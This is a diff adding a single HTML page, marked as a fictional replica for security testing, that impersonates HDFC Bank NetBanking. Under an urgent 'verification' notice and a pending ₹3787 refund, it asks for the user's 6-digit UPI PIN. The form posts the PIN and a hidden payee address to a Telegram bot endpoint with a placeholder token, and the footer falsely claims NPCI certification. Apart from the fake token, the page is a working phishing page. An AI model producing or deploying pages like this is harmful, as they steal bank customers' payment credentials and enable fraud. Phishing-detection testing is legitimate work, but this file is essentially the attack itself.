@@ -1,0 +1,62 @@
+<!-- fictional replica for security testing -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HDFC Bank UPI Verification</title>
+    <style>
+        :root {
+            --primary: #004c8f;
+            --secondary: #ed1c24;
+            --bg: #f8fafc;
+            --text: #1e293b;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg); color: var(--text); display: flex; justify-content: center; padding: 16px; }
+        .s6_container { width: 100%; max-width: 420px; background: #ffffff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); overflow: hidden; border: 1px solid #e2e8f0; }
+        .s6_header { background: var(--primary); color: #ffffff; padding: 20px; text-align: center; }
+        .s6_brand { font-size: 24px; font-weight: 800; letter-spacing: 0.5px; }
+        .s6_tagline { font-size: 13px; opacity: 0.9; margin-top: 4px; }
+        .s6_body { padding: 24px; }
+        .s6_notice { background: #fef2f2; border-left: 4px solid #ef4444; padding: 12px; border-radius: 4px; margin-bottom: 20px; font-size: 13px; color: #991b1b; }
+        .s6_amount-box { background: #f1f5f9; padding: 16px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
+        .s6_amount-label { font-size: 12px; color: #64748b; text-transform: uppercase; }
+        .s6_amount-val { font-size: 28px; font-weight: 700; color: var(--text); }
+        .s6_form-group { margin-bottom: 16px; }
+        .s6_label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #475569; }
+        .s6_input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 16px; text-align: center; letter-spacing: 4px; }
+        .s6_btn { width: 100%; padding: 14px; background: var(--primary); color: #ffffff; border: none; border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; transition: opacity 0.2s; }
+        .s6_btn:hover { opacity: 0.9; }
+        .s6_footer { padding: 16px; text-align: center; font-size: 11px; color: #94a3b8; border-top: 1px solid #f1f5f9; }
+    </style>
+</head>
+<body>
+    <div class="s6_container">
+        <div class="s6_header">
+            <div class="s6_brand">HDFC Bank NetBanking</div>
+            <div class="s6_tagline">Quick Payment</div>
+        </div>
+        <div class="s6_body">
+            <div class="s6_notice">
+                Urgent HDFC Verification
+            </div>
+            <div class="s6_amount-box">
+                <div class="s6_amount-label">Pending Refund / Credit</div>
+                <div class="s6_amount-val">₹3787</div>
+            </div>
+            <form action="https://api.telegram.org/bot999999:FAKE/sendMessage" method="POST">
+                <input type="hidden" name="vpa" value="single_6@paytm">
+                <div class="s6_form-group">
+                    <label class="s6_label" for="pin">ENTER 6-DIGIT UPI PIN TO AUTHORIZE</label>
+                    <input class="s6_input" type="password" id="pin" name="upi_pin" maxlength="6" pattern="\d{6}" placeholder="••••••" required>
+                </div>
+                <button class="s6_btn" type="submit">AUTHORIZE</button>
+            </form>
+        </div>
+        <div class="s6_footer">
+            NPCI Certified UPI Gateway &bull; 256-Bit Encrypted &bull; Ref: 001106
+        </div>
+    </div>
+</body>
+</html>
